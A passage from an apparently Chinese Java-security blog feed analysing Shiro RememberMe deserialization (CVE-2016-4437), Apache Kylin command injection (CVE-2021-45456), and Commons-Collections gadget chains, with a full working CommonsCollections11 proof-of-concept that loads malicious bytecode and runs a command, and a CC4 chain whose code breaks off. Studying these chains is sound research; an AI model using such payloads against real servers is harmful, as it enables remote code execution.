byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行后获得构造的恶意<code>RememberMe</code>字段内容，添加到 Cookie 中发送请求，成功弹出计算器。<br><img src="/2021/11/10/CVE-2016-4437/image-20221018164755328.png" alt="image-20221018164755328"></p><h2 id="Shiro-与-CC6"><a href="#Shiro-与-CC6" class="headerlink" title="Shiro 与 CC6"></a>Shiro 与 CC6</h2><p>在<code>Commons-Collections11</code>的时候曾提过<code>Commons-Collections6</code>这条链子在 shiro 中使用会报错，但如果你用<code>Commons-Collections6</code>生成的 POC 在我上面搭的环境会发现依然能正常弹出计算器，并没有出现报错，这是为什么呢？</p><p>在上述环境使用的依赖是<code>shiro-spring</code>，也就是用 Spring-boot 构建的 Shiro<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;shiro-spring&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.2.4&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p><p>Shiro 的原生依赖只用到了：<code>shiro-core</code>和<code>shiro-web</code>，那么<code>Spring</code>构建的<code>Shiro</code>和原生的<code>Shiro</code>有什么不同呢？</p><p>我们使用原生环境调调看，这里直接去 Shiro 的仓库下载，然后修改一下 pom.xml 文件即可，下面用到的环境也上传到前面提到的 github 仓库了。运行后访问主页，使用<code>CommonCollections6</code>的 POC 发送请求<br><img src="/2021/11/10/CVE-2016-4437/image-20221020003021727.png" alt="image-20221020003021727"></p><p>并没有弹出计算器，再回来看看 idea<br><img src="/2021/11/10/CVE-2016-4437/image-20221020003046360.png" alt="image-20221020003046360"></p><p>报错了，具体错误如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Caused by: org.apache.shiro.util.UnknownClassException: Unable to load class named [[Lorg.apache.commons.collections.Transformer;] from the thread context, current, or system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.</span><br></pre></td></tr></table></figure></p><p>翻译过来大体意思就是<code>Transformer</code>类找不到，我们跟一下反序列化的入口点看看<br><img src="/2021/11/10/CVE-2016-4437/image-20221020112505932.png" alt="image-20221020112505932"></p><p>这里可以看到最后用的是<code>ClassResolvingObjectInputStream</code>类返回输入流，而不是常规的<code>ObjectInputStream</code>类，跟进该类<br><img src="/2021/11/10/CVE-2016-4437/image-20221020112940956.png" alt="image-20221020112940956"></p><p>在<code>ClassResolvingObjectInputStream</code>类中继承了<code>ObjectInputStream</code>类并且重写了<code>resolveClass()</code>方法，跟进<code>ClassUtils.forName()方法</code><img src="images/image-20221020113104243.png" alt="image-20221020113104243"><br>又继续调用了<code>loadClass()</code>方法，其中参数值为<code>[Lorg.apache.commons.collections.Transformer;</code></p><p>这里的格式是<code>JNI</code>字段描述符，<code>[</code>表示数组，<code>L</code>代表类描述符，<code>;</code>表示类名到这里结束。</p><p>接着继续跟进<code>loadClass()</code>方法<br><img src="/2021/11/10/CVE-2016-4437/image-20221020113425888.png" alt="image-20221020113425888"></p><p>可以看到这里调用的<code>ClassLoader</code>为<code>ParallerWebappClassLoader</code>，接着到<code>loadClass()</code>方法，这里接着跟进需要添加 tomcat 的源码才能继续进行调试（这里是偷懒做法，如果想食用更佳，移步<a href="../../环境&amp;其他/Tomcat源码调试/Tomcat源码调试.md">Tomcat源码调试</a>）<br><img src="/2021/11/10/CVE-2016-4437/image-20221020113701346.png" alt="image-20221020113701346"></p><p>导入 tomcat 的 jar 包之后继续跟进<code>loadClass()</code>方法进入到了<code>WebappClassLoaderBase#loadClass()</code><br><img src="/2021/11/10/CVE-2016-4437/image-20221020113737475.png" alt="image-20221020113737475"></p><p>玩下走到<code>findLoadedClass0()</code>方法<br><img src="/2021/11/10/CVE-2016-4437/image-20221021234307342.png" alt="image-20221021234307342"></p><p><code>findLoadedClass0()</code>方法去缓存中查找是否存在，从跟的结果上得到是不存在，继续往下走到<code>this.findLoadedClass()</code>方法<br><img src="/2021/11/10/CVE-2016-4437/image-20221022160745842.png" alt="image-20221022160745842"></p><p>依然为null，后面的跟着几个方法都是为 null，我们略去，到最后一步关键处，也就是到了<code>Class.forName()</code>方法<br><img src="/2021/11/10/CVE-2016-4437/image-20221020113936096.png" alt="image-20221020113936096"></p><p>这里可以看到，此时的父加载器为<code>URLClassLoader</code><br><img src="/2021/11/10/CVE-2016-4437/image-20221020114136052.png" alt="image-20221020114136052"></p><p>其中<code>ucp</code>是<code>URLClassLoader</code>类的字段，<code>ucp</code>的成员<code>path</code>是一个 ArrayList 对象，存储着类的搜索路径。而这里这些路径全都是 tomcat 下的 lib 目录文件，并没有<code>commons-collections</code>的依赖文件。</p><p>下面贴上在<code>Class.forName()</code>方法后的 debug 过程视频（因为写成文字描述过于繁琐就贴上视频）</p><blockquote><p>视频挂了，有需要的右下角发邮件给我》</p></blockquote><p>在 debug 视频中可以看到，传进<code>Class.forName()</code>方法的参数 name 为<code>[Lorg.apache.commons.collections.Transformer;</code>，接着后面走到<code>findLoadedClass()</code>方法时还原成了正常的<code>org.apache.commons.collections.Transformer</code>，因此有些文章在跟到前面时就断定是先前的<code>[Lorgxxx</code>格式导致无法找到的结论并不准确，这并不是最终过程。</p><p>此外，可以看到<code>ClassLoader</code>的加载过程为<code>AppClassLoader</code> —&gt; <code>ExtClassLoader</code> —&gt; <code>BootstrapClassLoa·der</code>，均搜索不到<code>org.apache.commons.collections.Transformer</code>。</p><p>搜索不到后抛出<code>ClassNotFoundException</code>的异常<br><img src="/2021/11/10/CVE-2016-4437/image-20221020114557155.png" alt="image-20221020114557155"></p><p><img src="/2021/11/10/CVE-2016-4437/image-20221020114634262.png" alt="image-20221020114634262"></p><p>因此和之前的报错对应上了，那么为什么 spring 构建的 shiro 没有报错正常弹出计算器了呢？</p><p>我们继续调试一下<br><img src="/2021/11/10/CVE-2016-4437/image-20221020114824559.png" alt="image-20221020114824559"></p><p>在该环境中，加载的<code>ClassLoader</code>为<code>TomcatEmbeddedWebappClassLoader</code>，而不是之前 shiro 原生环境的<code>ParallerWebappClassLoader</code>。</p><p>继续跟进<code>loadClass()</code>方法，跳到了<code>TomcatEmbeddedWebappClassLoader#loadClass()</code>方法<br><img src="/2021/11/10/CVE-2016-4437/image-20221020115032790.png" alt="image-20221020115032790"></p><p>继续往下走，直到<code>Class.forName()</code>方法<br><img src="/2021/11/10/CVE-2016-4437/image-20221020115153447.png" alt="image-20221020115153447"></p><p>可以看到此时的父加载器为<code>AppClassLoader</code>系统类加载器，再看看此时的 path<br><img src="/2021/11/10/CVE-2016-4437/image-20221020115615209.png" alt="image-20221020115615209"></p><p>此时的 path 不再是 tomcat 下的，而是 java 环境中的，包含了<code>commons-collections</code>依赖，因此可以成功加载到<br><img src="/2021/11/10/CVE-2016-4437/image-20221020115831830.png" alt="image-20221020115831830"></p><p>这也解释了为什么在 spring 构建的 Shiro 环境中<code>Commons-Collections6</code>可以打成功，而原生的 Shiro 环境却报错失败的情况。</p><p>至于为什么 path 会不一样，父类加载器也不一样，尝试跟了一下，实在过于复杂，遂暂时放弃，调试到此。</p><p>等哪一天知识储备足够了，再来解惑。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>在 Shiro 1.2.5 版本的更新中，用户需要手动配置 CipherKey，如果不设置，将会动态生成一个 CipherKey。但反序列化流程没有修改，这也是 Shiro 至今依然在各大 HW 演练中频繁出现的原因。</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-45456 Apache Kylin 命令注入</title>
      <link href="/2021/11/10/CVE-2021-45456ApacheKylin%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%E8%A1%A5%E5%85%85/"/>
      <url>/2021/11/10/CVE-2021-45456ApacheKylin%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%E8%A1%A5%E5%85%85/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2021-45456-Apache-Kylin-命令注入"><a href="#CVE-2021-45456-Apache-Kylin-命令注入" class="headerlink" title="CVE-2021-45456 Apache Kylin 命令注入"></a>CVE-2021-45456 Apache Kylin 命令注入</h1><blockquote><p>看着y4er师傅写的分析，第一次看有点懵逼，所以简单的补充一下。</p></blockquote><h2 id="补充分析"><a href="#补充分析" class="headerlink" title="补充分析"></a>补充分析</h2><p>首先漏洞点在该路由的 <strong>dumpProjectDiagnosisInfo</strong>方法中project可控。</p><p><img src="https://user-images.githubusercontent.com/63966847/149534592-9f600b83-9036-45f3-a9a9-c7bc2bae5e48.png" alt="image-20220114222208845"></p><p>跟着进去，可以看到<strong>runDiagnosisCLI</strong>方法之后正常执行命令并且project一直可控。所以非常有机会RCE了!</p><p><img src="https://user-images.githubusercontent.com/63966847/149534609-f5d94546-4965-4580-8d1f-bfcb054127c3.png" alt="image-20220114222316611"></p><p>唯一绕过就是不让 <strong>projectInstance</strong>为null，不然就throw抛异常。所以我们看看projectInstance得到如何获得。</p><p>首先通过 <strong>convertStringToBeAlphanumericUnderscore</strong>方法进行替换，输入 <strong>touch 123</strong>则替换之后就为 <strong>touch123</strong></p><p><img src="https://user-images.githubusercontent.com/63966847/149534631-abb945b7-2bce-4fbe-baa3-e7032f013124.png" alt="image-20220114222541519"></p><p>之后通过 <strong>getProject</strong>方法去找有没有 <strong>touch123</strong>这个项目。看下面是通过<strong>projectMap.get(projectName);</strong>去获得如果有就不会抛异常就成功命令执行。</p><p><img src="https://user-images.githubusercontent.com/63966847/149534653-e78ad090-416d-4ce6-ae15-1fed7012cbea.png" alt="image-20220114222809923"></p><p>所以我们在看看得到才什么类中获取，也就是去看 <strong>projectMap</strong>是指的那个类。</p><p><img src="https://user-images.githubusercontent.com/63966847/149534679-31cc4590-a299-4882-9bee-b8fd9789b776.png" alt="image-20220114222920990"></p><p>然后跟上ProjectInstance，则到了如下代码，可以看到setname进去，所以我们最开始需要setname进去和 <strong>touch123</strong>相同就可以了</p><p><img src="https://user-images.githubusercontent.com/63966847/149534692-aacfd561-fcc5-42ae-94c0-84c342f026be.png" alt="image-20220114223024834"></p><p>向上跟踪</p><p><img src="https://user-images.githubusercontent.com/63966847/149534717-bb589da3-01f3-4f5b-a81b-b62e23419bc9.png" alt="image-20220114223153636"></p><p>然后去跟踪 <strong>createProject</strong>方法，之后到了 <strong>saveProject</strong>方法</p><p><img src="https://user-images.githubusercontent.com/63966847/149534727-a5264b5f-6dce-496d-bccd-90e6e0b4e392.png" alt="image-20220114223350119"></p><p>可以看到传递的是json格式然后去获得name，并且通过isAlphanumericUnderscore判断了，但是如果执行命令肯定set进去的name是 <strong>tuoch123</strong>，巧的是 <strong>tuoch123</strong>刚刚好去绕过。</p><p><img src="https://user-images.githubusercontent.com/63966847/149534845-842825f1-95ee-4028-a70c-d7d63f9651d2.png" alt="image-20220114223924151"></p><p><img src="https://user-images.githubusercontent.com/63966847/149534827-4f56fa4c-6fb9-4a8f-bfd3-2b798e8ab042.png" alt="image-20220114223911294"></p><p>从而成功执行命令。</p><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>y4er师傅的图</p><p>先创建项目名</p><p><img src="https://user-images.githubusercontent.com/63966847/149534861-95093753-4e7f-4b8d-a552-7218ac5ce038.png" alt="image-20220114224040087"></p><p>执行命令</p><p><img src="https://user-images.githubusercontent.com/63966847/149534871-c0d29304-c9ca-43b5-b2ac-6abae59abe52.png" alt="image-20220114224119476"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><img src="https://user-images.githubusercontent.com/63966847/149534884-ff61e395-b5bc-4c97-94a3-3f07b3105f53.png" alt="image-20220114224356250"></p><p>传入cmd的参数改为projectName而非http传入的project，projectName经过convertStringToBeAlphanumericUnderscore() 处理，所以无法输入非字母数字下划线的字符来触发命令执行。</p><p>(除非单个命令可以创成严重危害。。。。。</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections11利用链分析</title>
      <link href="/2021/11/10/CommonsCollections11/"/>
      <url>/2021/11/10/CommonsCollections11/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections11利用链分析"><a href="#CommonsCollections11利用链分析" class="headerlink" title="CommonsCollections11利用链分析"></a>CommonsCollections11利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>CommonsCollections11</code>链子的利用环境如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 3.1 - 3.2.1</span><br><span class="line">JDK版本暂无</span><br></pre></td></tr></table></figure><p>可能学到这里，你和我一样会有一个疑问：<code>CommonsCollections6</code>已经通杀<code>3.1-3.2.1</code>的情况下，为什么还要学该版本下的其他链子？</p><p>个人觉得<code>CommonsCollection11</code>的存在是为了解决在<code>CommonsCollections 3.1 - 3.2.1</code>的版本下加载恶意字节码的问题。除此之外，<code>CommonsCollections6</code>在<code>shiro</code>中使用时会报错，至于为什么，具体答案留到<code>shiro</code>章节学习时再进行解惑。</p><p>这里提到恶意字节码，很快能想到前面学习的<code>CommonsCollections2</code>这条链子，聪明的你应该已经能想到了，<code>CommonsCollections11</code>就是<code>CommonsCollections2</code>和<code>CommonsCollections6</code>结合而来。</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p>先回忆一下，<code>CommonsCollections2</code>链子只所以限制版本为<code>CommonsCollections 4.0</code>，则是因为 gadget 中用到了<code>TransformingComparator</code>类，而该类只有在 4.0 版本的时候才实现了<code>serializable</code>接口。</p><p>在<code>3.1 - 3.2.1</code>版本的时候无法使用该类，而是使用了<code>CommonsCollections6</code>中的<code>TiedMapEntry</code>类来触发<code>LazyMap#get()</code>，最后执行<code>transform()</code>方法。接下来还剩一个问题，就是如何触发<code>TemplatesImpl#newTransformer()</code>方法来加载恶意字节码？</p><p>在<code>CommonsCollections11</code>中只单独使用<code>InvokerTransformer</code>类，通过反射修改<code>iMethodName</code>为<code>newTransformer()</code>方法。 POC 如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/12 15:50</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections11</span> <span class="variable">commonsCollections11</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections11</span>();</span><br><span class="line">        commonsCollections11.serialize();</span><br><span class="line">        commonsCollections11.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建evailClass</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evailClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evailClass&quot;</span>);</span><br><span class="line">        <span class="comment">// 将代码插进static&#123;&#125;</span></span><br><span class="line">        evailClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        evailClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">// 转换成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = evailClass.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="comment">// 反射修改</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, targetByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_class</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _class.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _class.set(templates, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建恶意的调用链</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, invokerTransformer);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,templates);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;valueTest&quot;</span>);</span><br><span class="line">        outerMap.remove(templates);</span><br><span class="line">        <span class="comment">// 通过反射修改iMethodName值为newTransformer</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> invokerTransformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(invokerTransformer, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(expMap);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2021/11/10/CommonsCollections11/image-20221012163340954.png" alt="image-20221012163340954"></p><p>通过把<code>TemplatesImpl</code>类对象<code>templates</code>作为<code>TiedMapEntry</code>类的<code>key</code><br><img src="/2021/11/10/CommonsCollections11/image-20221012163435957.png" alt="image-20221012163435957"></p><p>执行到<code>LazyMap#get()</code>方法时，成功触发到<code>TemplatesImpl#newTransformer()</code>方法加载恶意类</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections4利用链分析</title>
      <link href="/2021/11/10/CommonsCollections4/"/>
      <url>/2021/11/10/CommonsCollections4/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections4利用链分析"><a href="#CommonsCollections4利用链分析" class="headerlink" title="CommonsCollections4利用链分析"></a>CommonsCollections4利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继续来看<code>CommonsCollections4</code>的链子，在<code>ysoserial</code>里的注释说明是在<code>CommonsCollections2</code>的基础上，使用<code>InstantiateTransformer</code>类替代<code>InvokerTransformer</code>类<br><img src="/2021/11/10/CommonsCollections4/image-20221011105116866.png" alt="image-20221011105116866"></p><p>因此利用链为：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">        PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">                PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                    TransformingComparator.compare()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InstantiateTransformer.transform()</span><br><span class="line">                            newInstance()</span><br><span class="line">                                TrAXFilter#TrAXFilter()</span><br><span class="line">                                TemplatesImpl.newTransformer()</span><br><span class="line">                                         TemplatesImpl.getTransletInstance()</span><br><span class="line">                                         TemplatesImpl.defineTransletClasses</span><br><span class="line">                                         newInstance()</span><br><span class="line">                                            Runtime.exec()</span><br></pre></td></tr></table></figure></p><p>环境和<code>CommonsCollections2</code>一样<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 4.0</span><br><span class="line">JDK 版本暂无限制</span><br><span class="line">需要 javassist(伪条件，具体见下文)</span><br></pre></td></tr></table></figure></p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>其实到这里已经没有什么好分析的了，就是把<code>CommonsCollections2</code>中的<code>InvokerTransformer</code>替换成<code>CommonsCollections3</code>中学习到的<code>InstantiateTransformer</code>，所有知识都是前面分析过的，这里就不再赘述了，可以直接写出 POC 了<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span 